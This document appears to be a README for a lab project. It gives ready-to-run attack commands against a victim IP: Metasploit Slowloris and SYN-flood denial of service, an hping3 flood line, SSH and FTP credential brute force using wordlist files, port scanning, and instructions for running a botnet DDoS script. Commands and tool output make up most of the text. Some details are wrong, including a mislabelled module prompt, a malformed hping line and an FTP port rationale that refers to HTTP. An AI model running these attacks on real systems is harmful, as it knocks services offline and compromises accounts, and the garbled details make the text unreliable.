### ATTACK SCRIPT FOR TESTING

## DDoS & DoS Attacks and Bot Attacks

# BOTNET ATTACK Type DDoS

**Setup:**
1. Create a file in your VM Kali linux a python file
2. In BotNet.py in this project copy the file values
3. Paste it to the file you created in Kali Linux
4. Run it

**NOTE**
Make Sure that the configurations like IP ADDRESS is changed in the BOTNET Attack file

```shell
cd <PATH-FOLDER>
sudo python3 <FILE-NAME>
```

using Same Machine:

```shell
cd Test
py BotNet.py
```

# 1. Slowloris

Using Metasploit

```shell
msfconsole
msf6 > use auxiliary/dos/http/slowloris
msf6 auxiliary(dos/http/slowloris) > show options

Module options (auxiliary/dos/http/slowloris):

Name             Current Setting  Required  Description
----             ---------------  --------  -----------
delay            15               yes       The delay between sending ke
                                            ep-alive headers
rand_user_agent  true             yes       Randomizes user-agent with e
                                            ach request
rhost                             yes       The target address
rport            80               yes       The target port
sockets          150              yes       The number of sockets to use
                                                in the attack
ssl              false            yes       Negotiate SSL/TLS for outgoi
                                            ng connections


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/http/slowloris) > set rhost <VICTIM IP>
rhost => <VICTIM IP>
msf6 auxiliary(dos/tcp/synflood) > set rport <SERVER RUNNING PORT>
rport => <SERVER RUNNING PORT>
msf6 auxiliary(dos/http/slowloris) > run
```

Using hping ( custom packet/attack gegenrator)

- `hping3 -S -p 80 --flood 192.168.1.2 <TARGET-IP>` 


# 2. Syn Flood
```shell
msfconsole
msf6 auxiliary(dos/http/slowloris) > use auxiliary/dos/tcp/synflood
msf6 auxiliary(dos/tcp/synflood) > show options

Module options (auxiliary/dos/tcp/synflood):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
INTERFACE                   no        The name of the interface
NUM                         no        Number of SYNs to send (else unlim
                                        ited)
RHOSTS                      yes       The target host(s), see https://do
                                        cs.metasploit.com/docs/using-metas
                                        ploit/basics/using-metasploit.html
RPORT      80               yes       The target port
SHOST                       no        The spoofable source address (else
                                        randomizes)
SNAPLEN    65535            yes       The number of bytes to capture
SPORT                       no        The source port (else randomizes)
TIMEOUT    500              yes       The number of seconds to wait for
                                                new data


View the full module info with the info, or info -d command.

msf6 auxiliary(dos/tcp/synflood) > set RHOSTS <VICTIM IP>
RHOSTS => <VICTIM IP>
msf6 auxiliary(dos/tcp/synflood) > run

```
# 3. 

## SSH Patator

# SSH BRUTE FORCE
## SSH Brute Force (Metasploit)

**Setup:**
1. In your Kali Linux (Attacker), create two files for brute-force credentials: one for usernames and one for passwords.
2. Open a root terminal.
3. Run the following commands using Metasploit:

```shell
msfconsole
use auxiliary/scanner/ssh/ssh_login
set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
set RHOSTS <VICTIM-IP>
run
```

---

## FTP Brute Force (Metasploit)

**Setup:**
1. In your Kali Linux (Attacker), create two files for brute-force credentials: one for usernames and one for passwords.
2. Open a root terminal.
3. Run the following commands using Metasploit:

```shell
msfconsole
use auxiliary/scanner/ftp/ftp_login
set USER_FILE /home/jonel/Desktop/bruteforcefiles/usernames.txt
set USERPASS_FILE /home/jonel/Desktop/bruteforcefiles/passwords.txt
set RHOSTS <VICTIM-IP>
run
```

## Port Scanning 

# TCP / SYN Port Scan

    Using Metasploit

```shell
    msfconsole
    msf6> use auxiliary/scanner/portscan/tcp
    msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS <VICTIM-IP>
    msf6 auxiliary(scanner/portscan/tcp) > run
``` 

# Why PORTS are fixed and shouldnt be change if necessary?

## FTP Brute Force
* The FTP protocol, as defined by the IANA (Internet Assigned Numbers Authority), uses port 21 by default for control commands. This is universally accepted and implemented in most systems.
* Attack requires HTTP header parsing, which happens on port 80

## SSH Brute Force
* SSH (Secure Shell) uses port 22 by IANA and is rarely changed.
* Changing SSH port is a rare hardening technique and not common in most systems.

## Syn Flood
* SYN flood are threshold-based per port.
* Port 80 is common for simplified simulation as it allows visible test setups using basic HTTP services.

## Slowloris
* Attack requires HTTP header parsing, which happens on port 80